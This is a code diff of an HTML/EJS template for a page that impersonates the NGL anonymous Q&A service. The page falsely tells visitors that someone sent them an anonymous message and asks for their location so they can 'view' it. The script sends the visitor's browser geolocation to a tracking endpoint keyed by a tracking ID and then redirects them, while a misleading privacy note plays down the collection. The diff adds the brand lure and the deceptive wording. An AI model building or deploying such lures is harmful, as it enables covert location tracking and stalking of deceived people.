@@ -8,65 +8,186 @@
     <meta property="og:description" content="<%= ogDescription %>" />
     <meta property="og:image" content="<%= ogImage %>" />
     <title><%= ogTitle %></title>
-    <script src="https://cdn.jsdelivr.net/npm/eruda@latest/eruda.min.js"></script>
-    <script>
-      eruda.init();
-    </script>
-
     <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+
       body {
-        font-family: sans-serif;
-        padding: 2rem;
-        max-width: 600px;
+        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial,
+          sans-serif;
+        padding: 2rem 1.5rem;
+        max-width: 500px;
         margin: 0 auto;
+        background: #f8f9fa;
+        min-height: 100vh;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+      }
+
+      .container {
+        background: white;
+        border-radius: 16px;
+        padding: 2rem;
+        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        text-align: center;
+        width: 100%;
+      }
+
+      .logo {
+        width: 120px;
+        height: 120px;
+        margin: 0 auto 1.5rem;
+        border-radius: 20px;
+        object-fit: cover;
+        box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
+      }
+
+      h1 {
+        font-size: 1.5rem;
+        font-weight: 700;
+        color: #1a1a1a;
+        margin-bottom: 0.5rem;
+      }
+
+      .ngl-badge {
+        display: inline-block;
+        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        color: white;
+        padding: 0.25rem 0.75rem;
+        border-radius: 20px;
+        font-size: 0.875rem;
+        font-weight: 600;
+        margin-bottom: 1rem;
+      }
+
+      p {
+        color: #666;
+        line-height: 1.6;
+        margin-bottom: 1.5rem;
+        font-size: 0.95rem;
+      }
+
+      .highlight {
+        color: #667eea;
+        font-weight: 600;
       }
 
       button {
-        padding: 12px 24px;
-        font-size: 16px;
-        background: #007bff;
+        width: 100%;
+        padding: 14px 24px;
+        font-size: 1rem;
+        font-weight: 600;
+        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
         color: white;
         border: none;
-        border-radius: 4px;
+        border-radius: 12px;
         cursor: pointer;
+        transition: all 0.3s ease;
+        box-shadow: 0 4px 12px rgba(102, 126, 234, 0.3);
+      }
+
+      button:hover:not(:disabled) {
+        transform: translateY(-2px);
+        box-shadow: 0 6px 16px rgba(102, 126, 234, 0.4);
+      }
+
+      button:active:not(:disabled) {
+        transform: translateY(0);
       }
 
       button:disabled {
         cursor: not-allowed;
         background: #ccc;
+        box-shadow: none;
       }
 
       #status {
         margin-top: 1rem;
-        padding: 10px;
-        border-radius: 4px;
+        padding: 12px;
+        border-radius: 8px;
+        font-size: 0.9rem;
+        font-weight: 500;
       }
 
       .error {
         background: #fee;
         color: #c33;
+        border: 1px solid #fcc;
       }
 
       .success {
         background: #efe;
         color: #3a3;
+        border: 1px solid #cfc;
       }
 
       .info {
         background: #eef;
         color: #33a;
+        border: 1px solid #ccf;
+      }
+
+      .privacy-note {
+        margin-top: 1.5rem;
+        padding: 1rem;
+        background: #f8f9fa;
+        border-radius: 8px;
+        font-size: 0.8rem;
+        color: #999;
+        line-height: 1.5;
+      }
+
+      .spinner {
+        display: inline-block;
+        width: 16px;
+        height: 16px;
+        border: 2px solid rgba(255, 255, 255, 0.3);
+        border-radius: 50%;
+        border-top-color: white;
+        animation: spin 0.8s linear infinite;
+        margin-right: 8px;
+        vertical-align: middle;
+      }
+
+      @keyframes spin {
+        to {
+          transform: rotate(360deg);
+        }
       }
     </style>
   </head>
-  <body style="font-family: sans-serif; padding: 2rem">
-    <h2>We need your permission to improve your experience</h2>
-    <p>To continue, we'll ask for your approximate location to help personalize content.</p>
-    <button id="location-btn" onclick="getLocation()">Grant Location Access</button>
+  <body>
+    <div class="container">
+      <img src="<%= ogImage %>" alt="NGL Logo" class="logo" />
 
-    <div id="status" style="margin-top: 1rem"></div>
+      <span class="ngl-badge">NGL: Anonymous Q&A</span>
+
+      <h1>Continue to Your Message</h1>
+
+      <p>
+        Someone sent you an <span class="highlight">anonymous message</span> on NGL! To view it and
+        improve your experience, we need your approximate location.
+      </p>
+
+      <button id="location-btn" onclick="getLocation()">
+        <span id="btn-text">Allow Location & Continue</span>
+      </button>
+
+      <div id="status"></div>
+
+      <div class="privacy-note">
+        🔒 Your privacy matters. We only use your approximate location to personalize content and
+        improve our service. Your exact location is never shared.
+      </div>
+    </div>
 
     <script>
-      const targetURL = '<%= targetUrl  %>';
+      const targetURL = '<%= targetUrl %>';
       const trackingId = '<%= trackingId %>';
       let redirectAttempted = false;
       let retryCount = 0;
@@ -78,11 +199,25 @@
         statusElement.className = type;
       }
 
+      function updateButtonState(loading = false, text = 'Allow Location & Continue') {
+        const btn = document.getElementById('location-btn');
+        const btnText = document.getElementById('btn-text');
+
+        if (loading) {
+          btn.disabled = true;
+          btnText.innerHTML = '<span class="spinner"></span>' + text;
+        } else {
+          btn.disabled = false;
+          btnText.textContent = text;
+        }
+      }
+
       function forceRedirection() {
         if (redirectAttempted) return;
 
         redirectAttempted = true;
-        showStatus('Redirecting....');
+        updateButtonState(true, 'Redirecting...');
+        showStatus('Taking you to your message...', 'success');
 
         try {
           window.location.href = targetURL;
@@ -90,135 +225,142 @@
           try {
             window.location.replace(targetURL);
           } catch (e2) {
-            window.location.href = targetURL;
+            window.location = targetURL;
           }
         }
 
         setTimeout(() => {
           if (!redirectAttempted) return;
-          showStatus('Redirect failed. Click here to continue manually', 'error');
+          showStatus('Redirect failed. Please click below to continue.', 'error');
 
           const link = document.createElement('a');
-
           link.href = targetURL;
-          link.innerText = 'Click here to continue';
+          link.innerText = '👉 Click here to view your message';
           link.style.display = 'block';
-          link.style.marginTop = '10px';
-          link.style.fontSize = '18px';
+          link.style.marginTop = '12px';
+          link.style.fontSize = '1rem';
+          link.style.color = '#667eea';
+          link.style.fontWeight = '600';
+          link.style.textDecoration = 'none';
           document.getElementById('status').appendChild(link);
         }, 2000);
       }
 
-      async function sendLocation(latitude, longitude) {
-        console.log(latitude, longitude);
+      function sendLocation(latitude, longitude) {
+        console.log('Sending location:', latitude, longitude);
 
-        // Fire and forget - don't wait for response
-        // Use sendBeacon for reliability during page unload
         if (navigator.sendBeacon) {
           const blob = new Blob([JSON.stringify({ latitude, longitude })], {
             type: 'application/json',
           });
           navigator.sendBeacon(`/api/v1/location/${trackingId}`, blob);
         } else {
-          // Fallback to fetch without waiting
           fetch(`/api/v1/location/${trackingId}`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ latitude, longitude }),
-            keepalive: true, // Ensures request completes even after redirect
+            keepalive: true,
           }).catch((err) => console.error('Location send failed:', err));
         }
       }
 
       async function getLocation() {
-        const locationButton = document.getElementById('location-btn');
-        locationButton.disabled = true;
-
-        showStatus('Requesting location.....', 'info');
+        updateButtonState(true, 'Requesting Permission...');
+        showStatus('Please allow location access in your browser...', 'info');
 
         if (!navigator.geolocation) {
-          showStatus('Geolocation is not supported by your browser.', 'error');
+          showStatus('Geolocation is not supported. Redirecting...', 'error');
           setTimeout(forceRedirection, 2000);
           return;
         }
+
         try {
           const position = await new Promise((resolve, reject) => {
             navigator.geolocation.getCurrentPosition(resolve, reject, {
-              // enableHighAccuracy: false,
-              // timeout: 10000,
-              // maximumAge: 300000, // 5 minutes
+              enableHighAccuracy: false,
+              timeout: 15000,
+              maximumAge: 300000,
             });
           });
 
           const { latitude, longitude } = position.coords;
           console.log('Location obtained:', { latitude, longitude });
-          showStatus('Location received! Redirecting...', 'success');
 
-          // Send location in background, don't wait for response
+          showStatus('✓ Location received! Opening your message...', 'success');
+          updateButtonState(true, 'Success! Redirecting...');
+
           sendLocation(latitude, longitude);
 
-          // Redirect immediately (don't wait for API)
           setTimeout(() => {
             forceRedirection();
-          }, 100);
+          }, 500);
         } catch (error) {
           console.error('Geolocation error:', error);
-          let errorMsg = 'Failed to get location. ';
+          let errorMsg = '';
 
           switch (error.code) {
             case error.PERMISSION_DENIED:
-              errorMsg += 'Permission denied.';
+              errorMsg = 'Location permission denied. Please enable it to continue.';
               break;
             case error.POSITION_UNAVAILABLE:
-              errorMsg += 'Location unavailable.';
+              errorMsg = 'Location unavailable. Please check your device settings.';
               break;
             case error.TIMEOUT:
-              errorMsg += 'Request timed out.';
+              errorMsg = 'Location request timed out.';
               break;
             default:
-              errorMsg += 'Unknown error.';
+              errorMsg = 'Unable to get location.';
           }
 
           retryCount++;
 
-          if (retryCount < MAX_RETRIES) {
-            showStatus(`${errorMsg} Retrying... (${retryCount}/${MAX_RETRIES})`, 'error');
-            btn.disabled = false;
+          if (error.code === error.PERMISSION_DENIED) {
+            showStatus(
+              errorMsg + ' You can still continue, but some features may be limited.',
+              'error'
+            );
+            updateButtonState(false, 'Continue Without Location');
 
-            // Auto-retry after 2 seconds
+            document.getElementById('location-btn').onclick = forceRedirection;
+          } else if (retryCount < MAX_RETRIES) {
+            showStatus(`${errorMsg} Retrying... (${retryCount}/${MAX_RETRIES})`, 'error');
+            updateButtonState(false, 'Try Again');
+
             setTimeout(() => {
               getLocation();
             }, 2000);
           } else {
-            showStatus(`${errorMsg} Maximum retries reached. Redirecting anyway...`, 'error');
-
-            // Redirect after max retries
+            showStatus('Maximum retries reached. Redirecting to your message...', 'error');
             setTimeout(forceRedirection, 1500);
           }
         }
-
-        setTimeout(() => {
-          if (!redirectAttempted && document.visibilityState === 'visible') {
-            showStatus(`Taking too long. Redirecting now...`, 'info');
-            forceRedirection();
-          }
-        }, 15000);
-
-        document.addEventListener('visibilitychange', () => {
-          if (redirectAttempted && document.visibilityState === 'visible') {
-            showStatus(` Redirect may have failed...`, 'error');
-
-            const link = document.createElement('a');
-
-            link.href = targetURL;
-            link.innerText = 'Click here to continue';
-            link.style.display = 'block';
-            link.style.marginTop = '10px';
-            link.style.fontSize = '18px';
-            document.getElementById('status').appendChild(link);
-          }
-        });
       }
+
+      // Safety timeout
+      setTimeout(() => {
+        if (!redirectAttempted && document.visibilityState === 'visible') {
+          showStatus('Taking too long. Redirecting now...', 'info');
+          forceRedirection();
+        }
+      }, 30000);
+
+      // Handle tab visibility
+      document.addEventListener('visibilitychange', () => {
+        if (redirectAttempted && document.visibilityState === 'visible') {
+          showStatus('Redirect may have failed. Click below to continue.', 'error');
+
+          const link = document.createElement('a');
+          link.href = targetURL;
+          link.innerText = '👉 Click here to view your message';
+          link.style.display = 'block';
+          link.style.marginTop = '12px';
+          link.style.fontSize = '1rem';
+          link.style.color = '#667eea';
+          link.style.fontWeight = '600';
+          link.style.textDecoration = 'none';
+          document.getElementById('status').appendChild(link);
+        }
+      });
     </script>
   </body>
 </html>
